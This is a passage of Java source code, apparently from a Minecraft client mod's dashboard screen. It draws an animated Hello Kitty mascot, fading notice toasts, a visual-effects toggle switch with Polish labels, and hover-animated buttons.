			ellipse(c, centerX + 9, top + 3, 2, 2, theme.accent);
		}

		private void drawHelloKitty(DrawContext c, long now) {
			double phase = now / 650_000_000.0 * animationSpeed;
			double bob = animations ? Math.sin(phase) * 3 : 0;
			float tilt = animations ? (float) (Math.sin(phase * 0.7) * 0.045) : 0;
			float breathe = animations ? (float) (1 + Math.sin(phase * 0.6) * 0.015) : 1;
			int pivotX = x + sidebar / 2, pivotY = y + h - 95;
			c.getMatrices().pushMatrix();
			try {
				c.getMatrices().translate(pivotX, pivotY + (float) bob);
				c.getMatrices().rotate(tilt);
				c.getMatrices().scale(breathe, breathe);
				c.getMatrices().translate(-pivotX, -pivotY);
				int kx = x + sidebar / 2 - 34;
				int ky = y + h - 125;
				ellipse(c, kx + 33, ky + 28, 43, 40, theme.surface);
				ellipse(c, kx + 33, ky + 44, 17, 13, 0xFFF193BF);
				int fur = 0xFFFFF7FC;
				int ink = 0xFF49343F;
				for (int row = 0; row < 17; row++) {
					int half = 2 + row / 2;
					c.fill(kx + 16 - half, ky + row, kx + 16 + half + 1, ky + row + 1, tint(fur, opacity));
					c.fill(kx + 49 - half, ky + row, kx + 49 + half + 1, ky + row + 1, tint(fur, opacity));
				}
				ellipse(c, kx + 33, ky + 24, 29, 19, theme.bright);
				ellipse(c, kx + 33, ky + 23, 28, 18, fur);
				boolean blink = animations && (now / 1_000_000_000.0 * animationSpeed) % 4.3 < 0.16;
				ellipse(c, kx + 21, ky + 24, blink ? 4 : 2, blink ? 1 : 4, ink);
				ellipse(c, kx + 45, ky + 24, blink ? 4 : 2, blink ? 1 : 4, ink);
				ellipse(c, kx + 33, ky + 30, 3, 2, 0xFFF3CE72);
				ellipse(c, kx + 13, ky + 31, 5, 2, 0xFFFFB5D3);
				ellipse(c, kx + 53, ky + 31, 5, 2, 0xFFFFB5D3);
				ellipse(c, kx + 16, ky + 46 + (animations ? (int)(Math.sin(phase * 2) * 3) : 0), 6, 4, fur);
				ellipse(c, kx + 50, ky + 46 - (animations ? (int)(Math.sin(phase * 2) * 3) : 0), 6, 4, fur);
				heart(c, kx + 33, ky + 42, 0xFFFFD7EA);
				for (int i = 0; i < 3; i++) {
					int wy = ky + 23 + i * 6;
					c.fill(kx, wy, kx + 10, wy + 1, tint(ink, opacity));
					c.fill(kx + 56, wy, kx + 66, wy + 1, tint(ink, opacity));
				}
				c.getMatrices().pushMatrix();
				c.getMatrices().translate(0, animations ? (float)(Math.sin(phase * 1.6) * 1.5) : 0);
				int bow = 0xFFF58FBE;
				ellipse(c, kx + 47, ky + 8, 7, 6, bow);
				ellipse(c, kx + 60, ky + 8, 7, 6, bow);
				ellipse(c, kx + 54, ky + 8, 4, 4, 0xFFDB5D9D);
				ellipse(c, kx + 54, ky + 7, 2, 2, 0xFFFFCDE8);
				c.getMatrices().popMatrix();
				if (animations) {
					double sparkle = (Math.sin(now / 450_000_000.0 * animationSpeed) + 1) / 2;
					int glitter = tint(theme.bright, opacity * (0.3 + sparkle * 0.7));
					c.fill(kx - 6, ky + 8, kx - 1, ky + 9, glitter);
					c.fill(kx - 4, ky + 6, kx - 3, ky + 11, glitter);
					c.fill(kx + 71, ky + 32, kx + 76, ky + 33, glitter);
					c.fill(kx + 73, ky + 30, kx + 74, ky + 35, glitter);
				}
				center(c, "Hello Kitty", x + sidebar / 2, ky + 66, theme.bright);
			} finally { c.getMatrices().popMatrix(); }
		}

		private void renderNotice(DrawContext c, long now) {
			if (!showNotices || noticeTitle.isEmpty()) return;
			double age = (now - noticeAt) / 1_000_000_000.0;
			if (age < 0 || age >= 3.4) return;
			double fade = animations ? Math.min(1, age / 0.18) * Math.min(1, (3.4 - age) / 0.3) : 1;
			double previousOpacity = opacity;
			opacity *= fade;
			int bw = 270;
			int bx = w - bw - 14;
			int by = 58 + (animations ? (int) ((1 - fade) * -8) : 0);
			int stripe = noticeError ? 0xFFEE8795 : theme.bright;
			card(c, bx - 1, by - 1, bw + 2, 43, theme.stroke);
			card(c, bx, by, bw, 41, theme.surface);
			card(c, bx + 7, by + 8, 3, 23, stripe);
			text(c, fit(noticeTitle, bw - 30), bx + 18, by + 8, 0xFFF9F6FF);
			text(c, fit(noticeDetail, bw - 30), bx + 18, by + 23, theme.muted);
			card(c, bx + 2, by + 39, (int) ((bw - 4) * (1 - age / 3.4)), 2, stripe);
			opacity = previousOpacity;
		}

		private final class VisualSwitch extends ModernButton {
			private double knob = worldVisuals ? 1 : 0;
			private long previousFrame = System.nanoTime();
			VisualSwitch(int bx, int by) {
				super(bx, by, 46, "Visuals", false, false, () -> {
					worldVisuals = !worldVisuals;
					STORE.putBoolean("worldVisuals", worldVisuals);
					if (!worldVisuals) WorldVisuals.reset();
					save();
				});
				setMessage(net.minecraft.text.Text.literal(worldVisuals ? "Wyłącz efekty wizualne" : "Włącz efekty wizualne"));
			}
			@Override
			protected void drawIcon(DrawContext c, int mouseX, int mouseY, float delta) {
				long now = System.nanoTime();
				double dt = Math.max(0, Math.min(0.1, (now - previousFrame) / 1_000_000_000.0));
				previousFrame = now;
				knob = animations ? knob + ((worldVisuals ? 1 : 0) - knob) * (1 - Math.exp(-dt * 18)) : worldVisuals ? 1 : 0;
				int track = worldVisuals ? theme.accent : theme.stroke;
				card(c, getX(), getY() + 2, 46, 20, isFocused() || isHovered() ? theme.bright : track);
				card(c, getX() + 1, getY() + 3, 44, 18, track);
				ellipse(c, getX() + 11 + (int)(knob * 24), getY() + 12, 7, 7, 0xFFFFF4FA);
				setMessage(net.minecraft.text.Text.literal(worldVisuals ? "Wyłącz efekty wizualne" : "Włącz efekty wizualne"));
			}
		}

		public class ModernButton extends ButtonWidget {
			private final boolean accent;
			private final boolean danger;
			private double hoverAmount;
			private long previous = System.nanoTime();

			ModernButton(
					int bx, int by, int bw, String label,
					boolean accent, boolean danger, Runnable action
			) {
				super(
						bx, by, bw, 24,
						net.minecraft.text.Text.literal(label),
						ignored -> {
							if (!Dashboard.this.busy()) action.run();
						},
						DEFAULT_NARRATION_SUPPLIER
				);

				this.accent = accent;
				this.danger = danger;
			}
			@Override
			protected void drawLabel(net.minecraft.client.font.DrawnTextConsumer drawer) {
			}

			@Override
			protected void drawIcon(
					DrawContext c, int mouseX, int mouseY, float delta
			) {
				long now = System.nanoTime();

				double dt = Math.min(
						0.1, (now - previous) / 1_000_000_000.0
				);
				previous = now;

				double target =
						active && (isHovered() || isFocused()) ? 1 : 0;

				hoverAmount = animations
						? hoverAmount + (target - hoverAmount)
										* (1 - Math.exp(-dt * 12 * animationSpeed))
						: target;

				int base = danger ? 0xFF63363E : accent ? theme.accent : theme.surface;

				int highlight = danger ? 0xFF854550 : accent ? mix(theme.accent, theme.bright, 0.45) : theme.stroke;

				int background = active
						? mix(base, highlight, hoverAmount)
						: 0xFF292734;

				card(c, getX(), getY(), getWidth(), getHeight(), background);

				if (accent && active) {
					card(
							c, getX() + 2, getY() + 1,
							getWidth() - 4, 1, 0xFFC19BEF
					);
				}

				if (active && hoverAmount > 0.02) {
					card(
							c, getX() + 5, getY() + getHeight() - 3,
							(int) ((getWidth() - 10) * hoverAmount),
							1,
							danger ? 0xFFF4A4B0 : 0xFFD7BBFF
					);
				}

				center(
						c, fit(getMessage().getString(), getWidth() - 12),
						getX() + getWidth() / 2, getY() + 8,
						active ? 0xFFFFFFFF : 0xFFABA3B8
				);
			}
		}

		@Override
		public boolean shouldPause() {
			return false;
		}
	}
}